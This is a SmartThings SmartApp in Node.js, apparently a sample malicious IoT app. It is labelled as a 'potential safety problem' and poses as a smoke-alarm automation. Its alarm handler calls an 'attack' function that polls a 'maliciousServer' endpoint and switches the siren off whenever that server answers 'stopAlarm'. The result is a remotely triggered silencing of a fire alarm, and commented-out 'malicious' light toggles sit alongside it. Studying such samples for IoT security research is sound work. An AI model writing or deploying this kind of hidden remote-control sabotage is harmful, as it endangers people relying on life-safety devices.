
// desc : Potential safety problem by invoking a wrong method

//Door  App  3003
const express = require('express');
const SmartApp = require('@smartthings/smartapp');
const server = module.exports = express();
server.use(express.json());

const axios = require('axios');

const app = new SmartApp();

/* Only here for Glitch, so that GET doesn't return an error */
server.get('/', (req, res) => {
  res.send('desc : Potential safety problem by invoking a wrong method');
});

/* Handles lifecycle events from SmartThings */
server.post('/', async (req, res) => {
    console.log(JSON.stringify(req.body, null, 2));
    app.handleHttpCallback(req, res);
});

app.enableEventLogging(2)      // logs requests and responses as pretty-printed JSON
    .appId("96872513-2c51-4444-91f7-4cc4e52c4785")
    .permissions(['r:locations:*'],['r:devices:*'], ['x:devices:*'],['w:devices:*'])
    .page('mainPage', (context, page, configData) => {
    	page.section('safety', section => {
            // use a switch instead of a real sensor
            section.deviceSetting('smokeSensor').capabilities(['switch']).required(true).multiple(true).permissions('rwx');
            section.deviceSetting('alarm').capabilities(['alarm']).required(true).multiple(true).permissions('rwx');
        });
    })

    .updated(async (context, updateData) => {
        await context.api.subscriptions.delete()
        await context.api.subscriptions.subscribeToDevices(context.config.smokeSensor, 'switch', 'switch', 'smokeSensorHandler')
        await context.api.subscriptions.subscribeToDevices(context.config.alarm, 'alarm', 'alarm', 'alarmHandler')
    })

    // Called for both INSTALLED and UPDATED lifecycle events if there is no separate installed() handler
    .subscribedEventHandler('smokeSensorHandler', async (context, event) => {
        if (event.value ==='on'){
            await context.api.devices.sendCommands(context.config.alarm, 'alarm', 'siren');
            // await runScheduler(context, 2, 'turnOffThelight')
            // await runScheduler(context, 30, 'turnOnThelight')// malicious part
        }
    })

    .subscribedEventHandler('alarmHandler', async (context, event) => {
        if (event.value ==='siren'){
            await context.api.devices.sendCommands(context.config.alarm, 'alarm', 'siren');
            await attack(context)
        }
    })


    

    async function attack(context){
        
        try {
            const response = await axios.get('http://localhost:3000/maliciousServer');
            if (response.status === 200) {
                const httpData = response.data.toString();
                if (httpData ==='stopAlarm'){
                    await context.api.devices.sendCommands(context.config.alarm, 'alarm', 'off');
                }
            } else {
                console.error('Unknown response');
            }
        } catch (error) {
            console.error(`Error fetching malicious method: ${error}`);
        }
    }



let port = process.env.PORT || 8723;
server.listen(port);
console.log(`Listening: http://127.0.0.1:${port}`);
